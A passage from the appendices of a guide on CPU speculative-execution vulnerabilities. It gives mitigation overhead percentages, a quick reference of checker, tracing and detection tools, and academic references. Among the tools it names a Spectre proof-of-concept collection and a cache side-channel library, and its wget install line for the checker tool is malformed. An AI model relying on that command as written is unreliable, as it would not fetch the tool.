| KPTI (no PCID) | 20-46% | <1% | 15-30% | <1% |
| Retpoline | 2-8% | 1-3% | 2-5% | <1% |
| eIBRS | <1% | <1% | <1% | <1% |
| IBPB (per switch) | 5-15% | <1% | 10-25% | <1% |
| STIBP | 5-20% | 3-8% | 5-15% | 3-8% |
| SSBD | 2-4% | <1% | 2-8% | <1% |
| GDS microcode | <1% | <1% | <1% | 0-50% |
| nosmt | 20-30% | 20-30% | 20-30% | 20-30% |
| All combined | 30-60% | 5-15% | 20-40% | 20-55% |

## Appendix D: Tool Quick Reference

| Tool | Purpose | Install |
|------|---------|---------|
| spectre-meltdown-checker | Comprehensive vulnerability check | `wget speed47/spectre-meltdown-checker` |
| Mastik | Cache side-channel library | `github.com/0xADE1A1DE/Mastik` |
| safeside | Google's Spectre PoC collection | `github.com/google/safeside` |
| perf | Performance counter analysis | `apt install linux-tools-generic` |
| bpftrace | eBPF-based dynamic tracing | `apt install bpftrace` |
| Tetragon | eBPF security observability | `github.com/cilium/tetragon` |
| Falco | Runtime security detection | `falco.org` |
| YARA | Binary pattern matching | `apt install yara` |
| cpuid | CPU feature identification | `apt install cpuid` |
| msr-tools | MSR read/write | `apt install msr-tools` |
| hwloc | Hardware topology | `apt install hwloc` |

## Appendix E: Key References

1. Kocher et al. "Spectre Attacks: Exploiting Speculative Execution." S&P 2019.
2. Lipp et al. "Meltdown: Reading Kernel Memory from User Space." USENIX Security 2018.
3. Canella et al. "A Systematic Evaluation of Transient Execution Attacks." USENIX Security 2019.
4. Wikner et al. "Branch History Injection." USENIX Security 2022.
5. Yarom & Falkner. "FLUSH+RELOAD." USENIX Security 2014.
6. Liu et al. "Last-Level Cache Side-Channel Attacks are Practical." S&P 2015.
7. Gras et al. "TLBleed: TLB Attacks." USENIX Security 2018.
8. Moghimi. "Downfall: Exploiting Speculative Data Gathering." USENIX Security 2023.
9. Ormandy. "Zenbleed." Google Project Zero 2023.
10. VUSec. "Native BHI." 2024.
